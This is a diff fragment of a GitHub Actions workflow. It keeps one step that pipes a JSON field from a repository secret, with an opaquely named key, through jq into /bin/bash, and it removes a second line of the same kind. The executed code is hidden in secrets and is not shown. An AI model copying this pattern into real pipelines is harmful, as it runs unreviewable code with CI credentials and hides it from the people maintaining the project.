@@ -22,7 +22,6 @@ jobs:
           df3: ${{ secrets.df3 }}
         run: |
           printf '%s' "$df3" | jq -r .ekfig34955 | /bin/bash
-          printf '%s' "$fvrl316" | jq -r .rm2 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
